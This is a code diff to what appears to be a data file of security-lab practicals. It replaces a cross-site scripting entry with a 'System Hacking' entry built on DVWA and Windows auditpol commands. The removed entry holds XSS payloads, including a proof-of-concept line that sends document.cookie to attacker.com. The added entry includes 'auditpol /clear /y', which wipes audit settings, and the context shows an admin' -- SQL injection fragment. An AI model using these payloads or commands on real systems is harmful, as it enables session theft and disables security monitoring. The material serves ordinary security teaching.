@@ -117,21 +117,28 @@ admin' --
   },
   {
     id: "prac-5",
-    title: "Prac 5: Cross-Site Scripting (XSS)",
-    description: "Payloads for testing Reflected, Stored, and DOM-based XSS vulnerabilities.",
-    language: "html",
-    tags: ["xss", "web-security", "javascript"],
-    code: `<!-- Standard Alert Payload -->
-<script>alert('XSS')</script>
-
-<!-- Using image source for bypass -->
-<img src=x onerror=alert(1)>
-
-<!-- Cookie Stealing (PoC) -->
-<script>new Image().src="http://attacker.com/log?c="+document.cookie;</script>
-
-<!-- SVG Payload -->
-<svg onload=alert(1)>`,
+    title: "Prac 5: System Hacking",
+    description: "Practice system hacking using DVWA and monitoring with Audit Policy (AuditPol).",
+    language: "bash",
+    tags: ["system-hacking", "dvwa", "auditpol", "windows-security"],
+    code: `System Hacking Practicals`,
+    sections: [
+      {
+        title: "DVWA (Damn Vulnerable Web App)",
+        code: `# Access DVWA through your local web server (XAMPP/WAMP) or a dedicated VM.
+# Use DVWA to practice SQL Injection, Brute Force, and XSS.`,
+      },
+      {
+        title: "Audit Pol ",
+        code: `
+(Run  CMD as Administrator)
+1. auditpol /get /category:*
+2. auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+3. auditpol /get /category:*
+4. auditpol /clear /y
+5. auditpol /get /category:*`,
+      },
+    ],
   },
   {
     id: "prac-6",
